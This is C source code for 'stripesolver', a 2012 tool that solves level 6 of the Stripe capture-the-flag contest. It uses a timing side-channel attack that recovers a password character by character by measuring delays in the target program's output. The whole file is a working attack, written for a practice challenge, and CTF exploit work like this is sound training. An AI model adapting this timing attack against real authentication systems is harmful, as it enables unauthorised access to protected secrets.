/* stripesolver - A solver for level 6 of the Stripe CTF based on timing
 * Copyright (C) 2012 Thomas Hebb
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define MAX_PASSES 5
#define MAX_MATCHES 6
#define MAX_LENGTH 50

/* usecdifference - Find a sub-second difference between microsecond values.
 * Parameters:
 *   start: Start time in microseconds.
 *   end: End time in mocroseconds.
 * Return value: Difference between start and end in microseconds.
 */
inline long usecdifference (long start, long end) {
	long result = end - start;
	if (end < start) {
		// Everything we time will take less than a second
		result += 1000000;
	}
	return result;
}

/* findlargest - Find the largest value in an array of unsigned chars.
 * Parameters:
 *   counts: Unsigned char array.
 *   length: Number of elements in array.
 * Return value: Either the index of the largest value, or -1 in case of a tie.
 */
int findlargest (unsigned char *counts, int length) {
	int i, highind, highval = 0, tied = 1;
	for (i = 0; i < length; ++i) {
		if (counts[i] > highval) {
			highval = counts[i];
			highind = i;
			tied = 0;
		} else if (counts[i] == highval) {
			tied = 1;
		}
	}

	return tied ? -1 : highind;
}

/* qs_partition - Partitioning algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to partition.
 *   start: First index of area to partition.
 *   end: Last index of area to partition.
 * Return value: Index of the center of the partition.
 */
int qs_partition (long *array, int start, int end) {
	int pivot = array[(start + end) / 2];
	int i = start - 1, j = end + 1;

	while (1) {
		do {
			++i;
		} while (array[i] < pivot);
		do {
			--j;
		} while (array[j] > pivot);
		if (i < j) {
			long temp = array[i];
			array[i] = array[j];
			array[j] = temp;
		} else {
			return j;
		}
	}
}

/* qs_helper - Recursive algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to sort.
 *   start: First index of area to sort.
 *   end: Last index of area to sort.
 */
void qs_helper (long *array, int start, int end) {
	if (start >= MAX_MATCHES) {
		return;
	}
	int split = qs_partition(array, start, end);

	if (start < split) {
		qs_helper(array, start, split);
	}
	if (end > split + 1) {
		qs_helper(array, split + 1, end);
	}
}

/* quicksort - Quicksort algorithm.
 * Parameters:
 *   array: Array to sort.
 *   length: Number of elements in array.
 */
void quicksort (long *array, int length) {
	qs_helper(array, 0, length - 1);
}

/* startguesser - Starts the target application with the given string.
 * Parameters:
 *   fd: Array of file descriptors that will be filled with the pipes to stdin,
 *       stdout, and stderr, respectively.
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 * Return value: PID of child process.
 */
pid_t startguesser (int fd[3], char *path, char *file, char *str) {
	int infd[2], outfd[2], errfd[2];
	pid_t child;
	// Create pipes
	if (pipe(infd) == -1 || pipe(outfd) == -1 || pipe(errfd) == -1) {
		perror("Error creating pipes");
		exit(EXIT_FAILURE);
	}

	if (!(child = fork())) {
		// Child
		dup2(infd[0], 0);
		  close(infd[0]);
		  close(infd[1]);
		dup2(outfd[1], 1);
		  close(outfd[0]);
		  close(outfd[1]);
		dup2(errfd[1], 2);
		  close(errfd[0]);
		  close(errfd[1]);
		if (execl(path, path, file, str, NULL) == -1) {
			perror("Error executing guesser");
			exit(EXIT_FAILURE);
		}
		exit(EXIT_SUCCESS);
	}

	// Parent
	if (child == -1) {
		perror("Error forking");
		exit(EXIT_FAILURE);
	}

	// Set pipe array and return
	fd[0] = infd[1];
	  close(infd[0]);
	fd[1] = outfd[0];
	  close(outfd[1]);
	fd[2] = errfd[0];
	  close(errfd[1]);
	return child;
}

/* teststring - Tests the given string - assumes that all characters except
 *              the last two are correct.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 * Return value: Time taken for the second-to-last character to be checked,
 *               -1 if the string is too short, or -2 if it is confirmed
 *               to be correct.
 */
long teststring (char *path, char *file, char *str) {
	int numchars = strlen(str);
	if (numchars <= 1) {
		return -1;
	}

	int fd[3], i;
	struct timeval temp;
	long start = 0, end = 0;
	FILE *errfile;
	char current;

	// Start the guesser and open the stderr fd
	startguesser(fd, path, file, str);
	close(fd[0]);
	close(fd[1]);
	errfile = fdopen(fd[2], "r");
	setvbuf(errfile, NULL, _IONBF, 0);

	// Time each '.' output
	i = 0;
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '.') {
			if (i >= numchars - 2) {
				gettimeofday(&temp, NULL);
				if (i == numchars - 2) {
					start = temp.tv_usec;
				} else {
					end = temp.tv_usec;
				}
			}
			++i;
		} else if (current == 'i') { // Hack - 'i' only occurs in the success message
			fclose(errfile);
			return -2;
		}
	}

	fclose(errfile);
	return usecdifference(start, end);
}

/* markoutliers - Attempts to find and mark the lowest times in the in array.
 * Parameters:
 *   in: Array of length length containing time measurements.
 *   out: Array of length length which will get "correct" elements incremented.
 *   length: Number of elements in arrays.
 */
void markoutliers (long *in, unsigned char *out, int length) {
	long sorted[length];
	memcpy(sorted, in, length * sizeof(long));
	quicksort(sorted, length);

	int i, difference, threshhold, highval = 0;
	for (i = 1; i < MAX_MATCHES; ++i) {
		difference = sorted[i] - sorted[i - 1];
		if (difference > highval) {
			highval = difference;
			threshhold = sorted[i];
		}
	}

	/*printf("  {");
	for (i = 0; i < length - 1; ++i) {
		printf("%i, ", sorted[i]);
	}
	printf("%i} = %i\n", sorted[i], threshhold);*/

	for (i = 0; i < length; ++i) {
		if (in[i] < threshhold) {
			++out[i];
		}
	}
}

/* guesschar - Guesses the next character in string known.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   known: Current known string. The guessed character will be appended.
 *   charlist: List of characters to try.
 * Return value: Guessed character or 0 if an error occured.
 */
char guesschar (char *path, char *file, char *known, char *charlist) {
	int numchars = strlen(charlist);
	int index = strlen(known);
	long times[numchars];
	unsigned char counts[numchars];

	known[index + 1] = '!';
	known[index + 2] = '\0';

	// printf("Guessing character %i\n", index + 1);
	// printf("  Zeroing counts\n");
	int i, j = 0;
	for (i = 0; i < numchars; ++i) {
		counts[i] = 0;
	}

	// printf("  Running passes\n");
	int highind;
	while ((highind = findlargest(counts, numchars)) == -1 && j <= MAX_PASSES) {
		// printf("    Pass %i\n", j + 1);
		for (i = 0; i < numchars; ++i) {
			known[index] = charlist[i];
			times[i] = teststring(path, file, known);
		}
		++j;
		markoutliers(times, counts, numchars);
	}
	// printf("Guessed character %i as %c after %i %s\n", index + 1, charlist[highind], j, j == 1 ? "pass" : "passes");

	if (highind == -1) {
		known[index] = '\0';
		return 0;
	} else {
		known[index + 1] = '\0';
		known[index] = charlist[highind];
		return charlist[highind];
	}
}

/* findstring - Finds an entire string.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   charlist: List of characters to try.
 * Return value: Guessed string or 0 if an error occured.
 */
char *findstring (char *path, char *file, char *charlist) {
	char *str = (char*)malloc(MAX_LENGTH);
	str[0] = '\0';
	int i = 0;
	while (guesschar(path, file, str, charlist) != 0 && i < MAX_LENGTH - 2) {
		if (teststring(path, file, str) == -2) {
			return str;
		}
		++i;
	}
	return 0;
}

/* main - Main function.
 * Parameters: Seriously?
 * Return value: You should know this.
 */
int main (int argc, char **argv) {
	char *charlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	FILE *fd;

	if (argc != 3) {
		fprintf(stderr, "Usage: %s path file\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	if (!(fd = fopen(argv[2], "r"))) {
		perror("Warning: Could not open file");
	} else {
		fclose(fd);
	}

	signal(SIGCHLD, SIG_IGN);
	char *str = findstring(argv[1], argv[2], charlist);
	printf("%s\n", str == 0 ? "Sorry, the password could not be found" : str);

	return EXIT_SUCCESS;
}

